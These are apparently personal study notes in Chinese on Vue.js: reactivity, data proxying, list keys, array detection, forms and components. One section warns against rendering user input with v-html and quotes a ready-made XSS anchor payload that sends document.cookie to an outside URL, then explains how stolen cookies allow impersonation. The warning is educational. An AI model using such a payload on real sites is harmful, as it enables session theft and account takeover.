# Vue学习注意点
## 1、.ico图标文件
- 要放在最外层的包下，
- live-server是把整个包放到本地服务器中的

## 2、
- 实现过程：把容器中的模版交给Vue实例，进行解析，解析完后，把数据挂载到页面的指定位置上去
- ![MVVM](image.png)
- 两个箭头对应【双向数据绑定】
- 1、下面的箭头M->V：数据流向页面
- 2、上面的箭头V->M：页面流向数据，实现对页面元素的监听(input输入框的修改)
- VM是连接V和M的桥梁，就是Vue实例对象
- ![图示理解](image-1.png)


## 3、数据代理图示：
第一个箭头只是把data对象中的数据传给vm的_data(二者是同一个对象；此操作不是数据代理)
第二个箭头才是数据代理(把_data中的两个属性给到vm对象，通过getter和setter进行读/写)
![数据代理](image-2.png)




## 4、事务
- 模版中用到的数据(属性和函数)，只能用在Vue实例中配置过的；不能使用未在Vue实例中配置的数据(属性和函数)

模版中用到的data中的数据发生修改时，会重新解析一遍模版

data中的数据都是Vue的属性

vm的_data中的属性就是配置项data中的属性
计算属性是拿着_data中的属性进行计算，计算完后直接丢给vm对象的（而不会再_data中有计算属性）


JS对象
简写：
methods:{

}
完整：（键应该要用 字符串 ）
"methods":{

}

错误：
number.a:{

}
正确：
"number.a":{

}


# list：
- 通过for生成多个标签，必须通过key给每个标签打一个标识(:key="p.id")
- key属性被Vue内部使用，不会显示在最终的html结构中

# key：
- 用户输入的信息是在真实DOM中的，而不是在虚拟DOM中
  - 真实DOM：是页面中用户可以交互的
  - 虚拟DOM：是在内存中的，由Vue管理，用户碰不到的

![index作为key](image-5.png)
只有3个input框可以复用，但是是根据key值(index)复用的
前插老刘后，每个li的index值变了，老刘的key变为了0，所以它获得了原来0号li中的input标签(及其中残留的内容)
本质是因为：前插打乱了各个li的key的顺序
后插就没事
![p.id作为key](image-6.png)

不显示写key，默认为index


# filter
"周杰伦".indexOf("")
不是-1，而是0
- 知识点：任何一个字符串包含空字符串"""


# 修改与刷新的流程：
- 修改vm中的name属性，会触发vm中(服务于name)的setter函数(vm对.vm_data的数据代理——>proxySetter())，
- 进而去修改vm._data中的name属性，又会触发vm._data中(服务于name)的setter函数(响应式——>reactiveSetter())，
- 进而去重新解析模版（即更新页面数据）

vm._data中的数据是由data配置项经过加工传过来的(reactiveSetter(),reactiveGetter())
vm中的属性是由vm._data进行数据代理得到的(proxySetter(),proxyGetter)()


对数组的检测实际是靠包装数组身上的常用修改数组的方法实现的
数组归Vue管理，身上本身的push不再使用，而使用Vue包装过的push（多加了一个重新解析模版的功能——实现更新页面数据）

<!-- 数组索引没有get set, 但是索引里边的对象有get set, 所以修改数组索引下的属性是可以的 -->


数组本身是有getter和setter的
数组中的元素本身没有getter和setter；但是数组中元素的属性(若元素是对象类型的话)有自己的getter和setter
①所以通过索引直接替换掉整个对象元素，不会被Vue监测；
- vm.student.friends[0]={name:"张三",age:"20"}
- 但是通过索引取出数组中的某个元素(对象类型)，修改它的属性，是会被Vue监测到的（因为它有自己的getter和setter）
②由于数组本身是有getter和setter的，只有通过指定的数组函数，对数组进行修改时，才会被Vue监测到
- vm.student.friends.splice(0,1,{name:"张三",age:"20"})

![数组元素是字符串](image-8.png)

![数组元素是对象](image-7.png)

【数据劫持】
把data中的数据经过加工放到vm._data中
- 加工：遍历一遍data中的所有属性（属性的属性……），给他们都加上getter和setter
- 当vm._data中的属性发生修改时，会调用setter函数（数据劫持）
- 完成两件事：
  - 1.修改数据
  - 2.重新解析模版，进而更新页面

若不给vm._data中的属性都加上setter函数，则无法实现【响应式】
- 即：vm._data中的属性发生修改时，不会被Vue监视到，(不调用setter函数)，因此不会去重新解析模版，页面数据不会同步更新

数据代理、数据劫持用的都是:
- Object.defineProperty(target,property,val){
  }


v-model收集输入框的value属性值
阻止点击提交按钮，表单的默认行为（页面跳转）
- <form @submit.prevent="func">

读取年龄的注意点：（两个number的用法，同时使用）
- 1、只能读数字：添加type="number"
- 2、读到的默认是字符串，要转换为数字：v-model.number



![Cookie](image-9.png)
浏览器向服务器发送登录请求时，请求成功后，服务器会返回一些Cookie，保存在浏览器中(一些身份信息；string类型；key:value结构)
浏览器按照网站对收到的Cookie进行分类
不同浏览器之间不能共享Cookie


若把用户的输入用v-html进行显示，可能会发生安全性问题
如下：若坏人在输入框提交了如下字符串，被浏览器用v-html动态解析成了a标签，显示在页面上；
其他用户看到后进行了a标签，则这个用户的在这个网站的所有Cookie都会被读取，然后以请求参数的形式发送到坏人在a标签中指定的服务器中，则坏人拿到了这个用户在这个网站的所有Cookie(相当于账号密码信息)，就可以冒充这个用户登录该网站！
- 在浏览器中导入该用户在该网站的所有Cookie(使用Cookie Editor——Google Plugins)，刷新网页，即可登录

- 有的服务器比较完善，会设置某些Cookie只能通过Http协议携带 和 读取(HttpOnly)
- 而不允许直接通过JS的document.cookie直接获取网站的所有Cookie，就相对安全

坏人的输入：
<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>



注意点：
template中只能有一个标签，
- 所以要用<div></div>包装一下

组件的data必须写成函数式
- 因为只有这样每次取用data中的属性时，返回的对象的地址都是不同的
- 为了组件复用时，组件内的data属性在所有用法处互相独立，互不干扰
必须写成函数是因为函数每次调用都返回新的对象，不然每次调用都指向同一个对象会导致改了一个另个也跟着变

{
  student:student
}
可简写为：(ES6新特性)
{
  student
}

Vue.extend()可以不写
但是底层会做判断，若components中的传入的对象是普通对象，最终还是会由Vue底层去调用

子组件若只在父组件中注册，则不能直接在vm指定的容器中使用，只能在在父组件的template配置中使用

vm->app(组件)->各种组件
![app](image-10.png)

- app领导众多组件，vm只需要领导app这一个组件

为了标准化开发
app一人之下万人之上

父组件的$children属性中存子组件
![vm与vc的关系](image-11.png)

配置对象options vc和vm基本一样
- 区别1：el，只有根实例vm能指定为哪个容器服务
- 区别2：vc中的data只能写函数式